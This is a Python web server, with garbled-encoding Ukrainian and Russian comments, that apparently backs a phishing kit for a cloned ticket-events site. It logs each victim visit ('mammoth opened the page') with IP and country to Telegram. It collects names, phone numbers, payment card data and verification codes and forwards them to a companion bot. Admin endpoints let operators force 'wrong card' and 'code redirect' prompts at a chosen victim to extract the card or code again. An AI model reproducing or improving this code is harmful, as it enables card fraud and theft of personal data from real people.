#!/usr/bin/env python3
import http.server
import socketserver
import os
import sys
from urllib.parse import urlparse, unquote
import requests
import sqlite3
import traceback
import json
from config import BOT_TOKEN, GROUP_ID, ADMIN_ID

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞
PORT = 8080  # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π HTTP –ø–æ—Ä—Ç
DIRECTORY = "events-art.com"  # –ü–∞–ø–∫–∞ –∑ —Å–∞–π—Ç–æ–º

# --- Country code to full name mapping ---
COUNTRY_NAMES = {
    'UA': 'Ukraine',
    'RU': 'Russia',
    'PL': 'Poland',
    'DE': 'Germany',
    'FR': 'France',
    'IT': 'Italy',
    'ES': 'Spain',
    'GB': 'United Kingdom',
    'US': 'United States',
    'NL': 'Netherlands',
    'TR': 'Turkey',
    'KZ': 'Kazakhstan',
    'BY': 'Belarus',
    'LT': 'Lithuania',
    'LV': 'Latvia',
    'EE': 'Estonia',
    'CZ': 'Czech Republic',
    'SK': 'Slovakia',
    'RO': 'Romania',
    'MD': 'Moldova',
    'GE': 'Georgia',
    'AM': 'Armenia',
    'AZ': 'Azerbaijan',
    'BG': 'Bulgaria',
    'GR': 'Greece',
    'HU': 'Hungary',
    'FI': 'Finland',
    'SE': 'Sweden',
    'NO': 'Norway',
    'DK': 'Denmark',
    'BE': 'Belgium',
    'CH': 'Switzerland',
    'AT': 'Austria',
    'IE': 'Ireland',
    'PT': 'Portugal',
    'HR': 'Croatia',
    'RS': 'Serbia',
    'SI': 'Slovenia',
    'BA': 'Bosnia and Herzegovina',
    'ME': 'Montenegro',
    'MK': 'North Macedonia',
    'AL': 'Albania',
    'LU': 'Luxembourg',
    'LI': 'Liechtenstein',
    'IS': 'Iceland',
    'CA': 'Canada',
    'AU': 'Australia',
    'NZ': 'New Zealand',
    # ... –¥–æ–¥–∞–π—Ç–µ —ñ–Ω—à—ñ –∫—Ä–∞—ó–Ω–∏ –∑–∞ –ø–æ—Ç—Ä–µ–±–∏ ...
}

# --- In-memory storage for request_again flags ---
REQUEST_AGAIN_FLAGS = {}
# --- In-memory blacklist and wrong_card flags ---
BLACKLISTED_IPS = set()
WRONG_CARD_FLAGS = {}
CODE_REDIRECT_FLAGS = {}
# --- In-memory storage for custom texts ---
CUSTOM_TEXTS = {}
# --- In-memory storage for support flags ---
SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}

def send_telegram_log(page, link, ip, country="", extra_user_id=None):
    # –í–∏–∑–Ω–∞—á–∞—î–º–æ –∫—Ä–∞—ó–Ω—É –∑–∞ IP, —è–∫—â–æ –Ω–µ –ø–µ—Ä–µ–¥–∞–Ω–æ
    if not country:
        try:
            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
            if resp.status_code == 200:
                data = resp.json()
                country = data.get("country", "")
        except Exception:
            country = ""
    # –ü–µ—Ä–µ—Ç–≤–æ—Ä—é—î–º–æ –∫–æ–¥ –∫—Ä–∞—ó–Ω–∏ –Ω–∞ –ø–æ–≤–Ω—É –Ω–∞–∑–≤—É
    country_full = COUNTRY_NAMES.get(country, country)
    msg = (
        f"‚ö†Ô∏è –ú–∞–º–æ–Ω—Ç –æ—Ç–∫—Ä—ã–ª —Å—Ç—Ä–∞–Ω–∏—Ü—É\n"
        f"üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞: {page}\n"
        f"üîó –°—Å—ã–ª–∫–∞: {link}\n"
        f"üåç IP: {ip}\n"
        f"üåè –°—Ç—Ä–∞–Ω–∞: {country_full}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    try:
        requests.post(url, data=data_group, timeout=2)
        requests.post(url, data=data_admin, timeout=2)
        if extra_user_id:
            data_user = {"chat_id": extra_user_id, "text": msg}
            requests.post(url, data=data_user, timeout=2)
    except Exception as e:
        print(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ª–æ–≥ —É Telegram: {e}")

def get_real_ip(handler):
    xff = handler.headers.get('X-Forwarded-For')
    if xff:
        return xff.split(',')[0].strip()
    return handler.client_address[0]

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # –î–æ–±–∞–≤–ª—è–µ–º CORS –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def is_blocked(self):
        # –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Ä–µ–∞–ª—å–Ω–∏–π IP –∑ X-Forwarded-For –¥–ª—è –∫–æ—Ä–µ–∫—Ç–Ω–æ—ó —Ä–æ–±–æ—Ç–∏ –∑–∞ –ø—Ä–æ–∫—Å—ñ/CDN
        ip = get_real_ip(self)
        return ip in BLACKLISTED_IPS

    def do_GET(self):
        # --- –ë–ª–æ–∫—É–≤–∞–Ω–Ω—è IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('<html><body><h2>Your IP has been blocked by the administrator.</h2></body></html>'.encode('utf-8'))
            return
        print(f"GET: {self.path}")  # –õ–æ–≥—É–≤–∞–Ω–Ω—è –≤—Å—ñ—Ö GET-–∑–∞–ø–∏—Ç—ñ–≤
        path = unquote(self.path.split('?', 1)[0])
        orig_path = path
        # –Ø–∫—â–æ —Ñ–∞–π–ª –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ, –∞–ª–µ —î –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ ‚Äî –ø–æ–≤–µ—Ä—Ç–∞—î–º–æ index.html –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—ó –ø–∞–ø–∫–∏
        fs_path = self.translate_path(path)
        if not os.path.exists(fs_path):
            if path.endswith('/'):
                path += 'index.html'
            elif not path.endswith('.html'):
                path += '/index.html'
            fs_path = self.translate_path(path)
            if os.path.exists(fs_path):
                self.path = path
        if orig_path.startswith('/file/ticket/'):
            filename = orig_path[len('/file/ticket/'):]
            ticket_path = os.path.join('tickets', filename)
            if os.path.exists(ticket_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'inline; filename=\"{filename}\"')
                self.end_headers()
                with open(ticket_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, 'Ticket not found')
            return
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # –Ø–∫—â–æ —Ü–µ —Ä–µ—Å—É—Ä—Å ‚Äî –Ω–µ –ª–æ–≥—É–≤–∞—Ç–∏
        if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
            return super().do_GET()
        # --- NEW: If ?e=code in URL, try to find event creator ---
        extra_user_id = None
        parsed = urlparse(self.path)
        if parsed.query:
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query)
            event_code = None
            if 'e' in qs:
                event_code = qs['e'][0]
            if event_code:
                try:
                    db = sqlite3.connect('users.db')
                    cur = db.cursor()
                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (event_code,))
                    row = cur.fetchone()
                    if row:
                        extra_user_id = row[0]
                    db.close()
                except Exception as e:
                    print(f"[DB] Error fetching event creator: {e}")
        # --- END NEW ---
        # –ù–æ—Ä–º–∞–ª—ñ–∑—É—î–º–æ —à–ª—è—Ö –¥–ª—è —É–Ω—ñ–∫–∞–ª—å–Ω–æ—Å—Ç—ñ
        norm_path = orig_path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # –õ–æ–≥—É–≤–∞—Ç–∏ —Ç—ñ–ª—å–∫–∏ —è–∫—â–æ —Ü–µ –æ—Å–Ω–æ–≤–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        # --- LOGIC CHANGE: always log to event creator if ?e=code, regardless of should_log ---
        ip = get_real_ip(self)
        if extra_user_id:
            print(f"üìù –õ–æ–≥—É—î–º–æ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –¥–ª—è event creator: {norm_path}")
            send_telegram_log(
                page=norm_path,
                link=self.path,
                ip=ip,
                extra_user_id=extra_user_id
            )
        # –ì—Ä—É–ø–∞ —Ç–∞ –∞–¥–º—ñ–Ω ‚Äî —è–∫ —ñ —Ä–∞–Ω—ñ—à–µ, —Ç—ñ–ª—å–∫–∏ –¥–ª—è –æ—Å–Ω–æ–≤–Ω–∏—Ö —Å—Ç–æ—Ä—ñ–Ω–æ–∫
        if should_log:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"üìù –õ–æ–≥—É—î–º–æ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏: {norm_path}")
                send_telegram_log(
                    page=norm_path,
                    link=self.path,
                    ip=ip
                )
        # --- –î–æ–¥–∞—î–º–æ –æ–±—Ä–æ–±–∫—É /check_request_again ---
        if self.path.startswith('/check_request_again'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            code = qs.get('code', [None])[0]
            print(f"[check_request_again][GET] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again][GET] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        # --- Wrong card polling ---
        if self.path.startswith('/check_wrong_card'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            ip = qs.get('ip', [None])[0]
            if ip and WRONG_CARD_FLAGS.get(ip):
                WRONG_CARD_FLAGS[ip] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        # --- Code redirect polling ---
        if self.path.startswith('/check_code_redirect'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            ip = qs.get('ip', [None])[0]
            if ip and CODE_REDIRECT_FLAGS.get(ip):
                CODE_REDIRECT_FLAGS[ip] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        if self.path.startswith('/get_custom_text'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            text_id = qs.get('text_id', [None])[0]
            text = CUSTOM_TEXTS.get(text_id, '')
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'text': text}).encode('utf-8'))
            return
        if self.path.startswith('/check_support'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            ip = qs.get('ip', [None])[0]
            flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                'show_support': bool(flag.get('support')),
                'show_text': bool(flag.get('text_id')),
                'text_id': flag.get('text_id', '')
            }).encode('utf-8'))
            return
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")

    def do_POST(self):
        path = unquote(self.path.split('?' ,1)[0])
        # --- –ë–ª–æ–∫—É–≤–∞–Ω–Ω—è IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('BLOCKED'.encode('utf-8'))
            return
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = get_real_ip(self)
                send_telegram_log(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        elif path == '/submit_form':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                phone = data.get('phone', '')
                name = data.get('name', '')
                mail = data.get('mail', '')
                ip = get_real_ip(self)
                # –ù–∞–¥—Å–∏–ª–∞—î–º–æ —É main.py
                try:
                    requests.post('http://localhost:8081/notify_admin', json={
                        'phone': phone,
                        'name': name,
                        'mail': mail,
                        'ip': ip
                    }, timeout=2)
                except Exception as e:
                    print(f"[notify_admin] Error: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        elif self.path == '/send_payment_data':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                print("[send_payment_data] –û—Ç—Ä–∏–º–∞–Ω–æ –¥–∞–Ω—ñ:", data)
                resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
                print(f"[send_payment_data] –í—ñ–¥–ø–æ–≤—ñ–¥—å –≤—ñ–¥ main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_payment_data] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/send_code':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                print("[send_code] –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥:", data)
                resp = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=3)
                print(f"[send_code] –í—ñ–¥–ø–æ–≤—ñ–¥—å –≤—ñ–¥ main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_code] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/set_request_again':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                code = data.get('code')
                if code:
                    REQUEST_AGAIN_FLAGS[code] = True
                    print(f"[set_request_again] Set flag for code: {code}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no code')
            except Exception as e:
                print(f"[set_request_again] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path.startswith('/check_request_again'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            code = qs.get('code', [None])[0]
            print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        elif path == '/admin_action':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                action = data.get('action')
                ip = data.get('ip')
                if action == 'block' and ip:
                    BLACKLISTED_IPS.add(ip)
                    print(f'[admin_action] Blocked IP: {ip}')
                elif action == 'unblock' and ip:
                    BLACKLISTED_IPS.discard(ip)
                    print(f'[admin_action] Unblocked IP: {ip}')
                elif action == 'card' and ip:
                    WRONG_CARD_FLAGS[ip] = True
                    print(f'[admin_action] Wrong card for IP: {ip}')
                elif action == 'code' and ip:
                    CODE_REDIRECT_FLAGS[ip] = True
                    print(f'[admin_action] Code redirect for IP: {ip}')
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print(f'[admin_action] Error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif self.path == '/set_custom_text':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                text_id = data.get('text_id')
                text = data.get('text')
                if text_id and text is not None:
                    CUSTOM_TEXTS[text_id] = text
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no text_id or text')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif self.path == '/set_support_flag':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                ip = data.get('ip')
                flag_type = data.get('type')  # 'support' –∞–±–æ 'text'
                text_id = data.get('text_id')
                if ip and flag_type == 'support':
                    SUPPORT_FLAGS[ip] = {'support': True}
                elif ip and flag_type == 'text' and text_id:
                    SUPPORT_FLAGS[ip] = {'text_id': text_id}
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        else:
            self.send_response(404)
            self.end_headers()
        super().do_POST()

if __name__ == "__main__":
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"üåê –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω–∏–π –Ω–∞ –ø–æ—Ä—Ç—É {PORT}")
            print(f"üìÅ –û–±—Å–ª—É–≥–æ–≤—É—î–º–æ –ø–∞–ø–∫—É: {DIRECTORY}")
            print(f"üîó –°–∞–π—Ç –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é: http://localhost:{PORT}/")
            httpd.serve_forever()
    except PermissionError:
        print(f"‚ùå –ü–æ–º–∏–ª–∫–∞: –ù–µ–º–∞—î –ø—Ä–∞–≤ –¥–ª—è –∑–∞–ø—É—Å–∫—É –Ω–∞ –ø–æ—Ä—Ç—É {PORT}")
        print("üí° –°–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –∑ –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –ø–æ—Ä—Ç 8080")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"‚ùå –ü–æ–º–∏–ª–∫–∞: –ü–æ—Ä—Ç {PORT} –≤–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è")
            print("üí° –ó—É–ø–∏–Ω—ñ—Ç—å —ñ–Ω—à–∏–π —Å–µ—Ä–≤–µ—Ä –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ —ñ–Ω—à–∏–π –ø–æ—Ä—Ç")
        else:
            print(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –∑–∞–ø—É—Å–∫—É —Å–µ—Ä–≤–µ—Ä–∞: {e}")
    except KeyboardInterrupt:
        print("\n‚èπÔ∏è –°–µ—Ä–≤–µ—Ä –∑—É–ø–∏–Ω–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º")
    except Exception as e:
        print(f"‚ùå –ù–µ–æ—á—ñ–∫—É–≤–∞–Ω–∞ –ø–æ–º–∏–ª–∫–∞: {e}") 